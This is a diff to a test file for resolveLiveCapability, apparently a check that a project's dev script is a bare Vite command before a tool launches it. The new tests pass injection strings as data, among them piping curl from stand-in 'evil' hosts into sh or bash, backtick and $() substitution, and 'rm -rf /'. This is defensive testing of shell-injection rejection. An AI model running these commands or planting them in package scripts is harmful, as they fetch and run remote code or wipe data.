@@ -29,14 +29,16 @@ describe('resolveLiveCapability', () => {
     const root = projectsRootDir()
     fs.mkdirSync(root, { recursive: true })
     wsDir = fs.mkdtempSync(path.join(root, '__live_capability_test_'))
-    fs.writeFileSync(path.join(wsDir, 'package.json'), JSON.stringify({ name: 'fixture', dependencies: { react: '19.0.0' } }))
+    // A Node app: has a start script, but not one Studio would ever run.
+    fs.writeFileSync(path.join(wsDir, 'package.json'), JSON.stringify({ name: 'fixture', dependencies: { react: '19.0.0' }, scripts: { start: 'node server.js' } }))
   })
 
   afterEach(() => {
     fs.rmSync(wsDir, { recursive: true, force: true })
   })
 
-  function makeVite(): void {
+  function makeVite(command = 'vite'): void {
+    fs.writeFileSync(path.join(wsDir, 'package.json'), JSON.stringify({ name: 'fixture', dependencies: { react: '19.0.0' }, scripts: { dev: command } }))
     fs.writeFileSync(path.join(wsDir, 'vite.config.js'), 'export default {}\n')
     fs.mkdirSync(path.join(wsDir, 'src'), { recursive: true })
     fs.writeFileSync(path.join(wsDir, 'src', 'main.jsx'), 'export {}\n')
@@ -46,27 +48,43 @@ describe('resolveLiveCapability', () => {
     fs.writeFileSync(path.join(wsDir, name), '')
   }
 
-  it('refuses a project with no Vite config — "Live needs Vite", not a button that would fail', () => {
+  it('refuses a project whose dev/start script is not vite — "Live needs Vite", and nothing is ever spawned for it', () => {
     makeLockfile()
+    expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'not-vite' })
+    makeVite('next dev')
+    expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'not-vite' })
+    makeVite('curl http://x/y | sh')
     expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'not-vite' })
   })
 
-  it('refuses a Vite project that has never been installed', () => {
-    makeVite()
-    expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'no-lockfile' })
+  it('refuses a vite invocation with anything shell-shaped after it — npm run hands the whole string to a shell (sec-21)', () => {
+    for (const command of [
+      'vite && curl http://evil/x | sh',
+      'vite & curl evil.sh | bash &',
+      'vite `curl evil.sh`',
+      'vite $(curl evil.sh)',
+      'vite ; rm -rf /',
+      'vite --port 4000; curl evil.sh',
+      "vite --config 'x.js'",
+      'vite > /tmp/out',
+    ]) {
+      makeVite(command)
+      expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'not-vite' })
+    }
   })
 
-  it('accepts a Vite project with a lockfile, from any package manager', () => {
-    makeVite()
-    for (const lockfile of ['bun.lock', 'bun.lockb', 'pnpm-lock.yaml', 'yarn.lock', 'package-lock.json']) {
-      fs.rmSync(path.join(wsDir, 'bun.lock'), { force: true })
-      fs.rmSync(path.join(wsDir, 'bun.lockb'), { force: true })
-      fs.rmSync(path.join(wsDir, 'pnpm-lock.yaml'), { force: true })
-      fs.rmSync(path.join(wsDir, 'yarn.lock'), { force: true })
-      fs.rmSync(path.join(wsDir, 'package-lock.json'), { force: true })
-      makeLockfile(lockfile)
+  it('accepts vite through a runner and with arguments', () => {
+    for (const command of ['vite', 'vite dev --port 4000', 'vite --port=4000 --host 127.0.0.1 --config vite.dev.config.js', 'npx vite', 'bunx vite --host', 'pnpm exec vite', 'yarn vite']) {
+      makeVite(command)
       expect(resolveLiveCapability(wsDir)).toEqual({ capable: true })
     }
+  })
+
+  it('accepts a Vite project whether or not it has a lockfile — an uninstalled one fails to boot, which the registry reports', () => {
+    makeVite()
+    expect(resolveLiveCapability(wsDir)).toEqual({ capable: true })
+    makeLockfile()
+    expect(resolveLiveCapability(wsDir)).toEqual({ capable: true })
   })
 
   it('GET reports the capability alongside the tier, so the pill never has to guess', async () => {
